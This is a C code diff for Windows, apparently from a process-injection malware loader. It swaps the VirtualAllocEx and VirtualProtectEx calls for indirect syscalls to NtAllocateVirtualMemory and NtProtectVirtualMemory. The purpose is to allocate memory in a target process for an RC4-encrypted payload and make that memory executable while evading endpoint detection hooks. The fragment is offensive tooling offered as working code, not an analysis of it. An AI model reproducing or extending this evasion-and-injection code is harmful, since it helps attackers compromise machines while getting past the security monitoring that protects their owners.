@@ -320,6 +320,7 @@ int main(int argc, char* argv[]) {
 	DWORD					dwOldProtection			= 0x00,
 						dwThreadId			= 0x00;
 	SIZE_T					sNumberOfBytesWritten		= NULL;
+	SIZE_T				pRc4Encrypt = sizeof(Rc4EncData);
 
 
 	AddWin32uToIat();
@@ -367,10 +368,17 @@ int main(int argc, char* argv[]) {
 		hTargetProcess = (HANDLE)ConvertStringToPtr(argv[1]);
 		printf("[%d] Fetched Target Process Handle: %p \n", argc, hTargetProcess);
 
-		if (!(uBaseAddress = VirtualAllocEx((HANDLE)hTargetProcess, NULL, sizeof(Rc4EncData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
-			printf("[!] VirtualAllocEx Failed with Error: %d \n", GetLastError());
+		//printf("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
+		SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
+		if ((STATUS = RunSyscall((HANDLE)hTargetProcess, &uBaseAddress, 0, &pRc4Encrypt, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || uBaseAddress == NULL) {
+			printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
 			return -1;
 		}
+
+		/*if (!(uBaseAddress = VirtualAllocEx((HANDLE)hTargetProcess, NULL, sizeof(Rc4EncData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+			printf("[!] VirtualAllocEx Failed with Error: %d \n", GetLastError());
+			return -1;
+		}*/
 
 		printf("[%d] Allocated Memory At: 0x%p \n", argc, (PVOID)uBaseAddress);
 
@@ -395,10 +403,16 @@ int main(int argc, char* argv[]) {
 		printf("[%d] Fetched Allocated Base Address: 0x%p \n", argc, (PVOID)uBaseAddress);
 
 	
-		if (!VirtualProtectEx(hTargetProcess, uBaseAddress, sizeof(Rc4EncData), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
-			printf("[!] VirtualProtectEx Failed with Error: %d \n", GetLastError());
+		SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
+		if ((STATUS = RunSyscall(hTargetProcess, &uBaseAddress, &pRc4Encrypt, PAGE_EXECUTE_READ, &dwOldProtection)) != 0x00) {
+			printf("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
 			return -1;
 		}
+
+		/*if (!VirtualProtectEx(hTargetProcess, uBaseAddress, sizeof(Rc4EncData), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+			printf("[!] VirtualProtectEx Failed with Error: %d \n", GetLastError());
+			return -1;
+		}*/
 
 		printf("[%d] Memory Region Is Now RWX \n", argc);
 
